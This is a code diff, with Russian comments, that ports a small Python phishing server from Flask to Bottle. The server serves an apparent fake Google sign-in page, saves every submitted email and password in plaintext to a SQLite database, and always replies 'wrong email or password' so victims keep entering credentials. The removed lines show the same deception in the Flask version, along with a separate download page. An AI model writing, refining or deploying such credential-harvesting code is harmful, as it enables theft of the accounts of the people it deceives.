@@ -1,13 +1,13 @@
-from flask import Flask, render_template, request, jsonify
+from bottle import Bottle, run, template, request, static_file, response
 import sqlite3
 import os
 
-app = Flask(__name__)
+app = Bottle()
 
 # Путь к базе данных
 DATABASE = 'users.db'
 
-# Функция для создания базы данных и таблицы users
+# Функция для создания базы данных
 def create_database():
     if not os.path.exists(DATABASE):
         conn = sqlite3.connect(DATABASE)
@@ -22,7 +22,7 @@ def create_database():
         conn.commit()
         conn.close()
 
-# Проверка, существует ли запись с таким email и паролем (регистр учитывается)
+# Проверка дубликатов
 def is_duplicate(email, password):
     conn = sqlite3.connect(DATABASE)
     cursor = conn.cursor()
@@ -34,49 +34,30 @@ def is_duplicate(email, password):
 # Главная страница
 @app.route('/')
 def index():
-    return render_template('index.html')
-
-# Страница загрузки
-@app.route('/download')
-def download():
-    return render_template('download.html')
-
-# Страница входа через Google
-@app.route('/google')
-def google():
-    return render_template('google.html')
+    return template('google')
 
 # Обработка входа
-@app.route('/login', methods=['POST'])
+@app.route('/login', method='POST')
 def login():
-    try:
-        data = request.get_json()  # Получаем JSON-данные
-        if not data:
-            return jsonify({'error': 'No data provided'}), 400
+    email = request.forms.get('email')
+    password = request.forms.get('password')
 
-        email = data.get('email')
-        password = data.get('password')
+    if not is_duplicate(email, password):
+        conn = sqlite3.connect(DATABASE)
+        cursor = conn.cursor()
+        cursor.execute('INSERT INTO users (email, password) VALUES (?, ?)', (email, password))
+        conn.commit()
+        conn.close()
 
-        if not email or not password:
-            return jsonify({'error': 'Email and password are required'}), 400
+    response.content_type = 'application/json'
+    return {'error': 'Неверная почта или пароль'}
 
-        # Проверяем, есть ли дубликат (регистр учитывается)
-        if not is_duplicate(email, password):
-            # Сохраняем данные в базу данных
-            conn = sqlite3.connect(DATABASE)
-            cursor = conn.cursor()
-            cursor.execute('INSERT INTO users (email, password) VALUES (?, ?)', (email, password))
-            conn.commit()
-            conn.close()
-
-        # Всегда возвращаем "Неверная почта или пароль"
-        return jsonify({'error': 'Неверная почта или пароль'}), 401
-    except Exception as e:
-        # Логируем ошибку
-        print(f"Error: {e}")
-        return jsonify({'error': str(e)}), 500
+# Статические файлы
+@app.route('/static/<filename:path>')
+def serve_static(filename):
+    return static_file(filename, root='./static')
 
 # Запуск сервера
 if __name__ == '__main__':
-    create_database()  # Создаем базу данных при запуске приложения
-    app.run(host='0.0.0.0', port=5000, debug=True)  # Включаем режим отладки
+    create_database()
+    run(app, host='0.0.0.0', port=8080, debug=True)
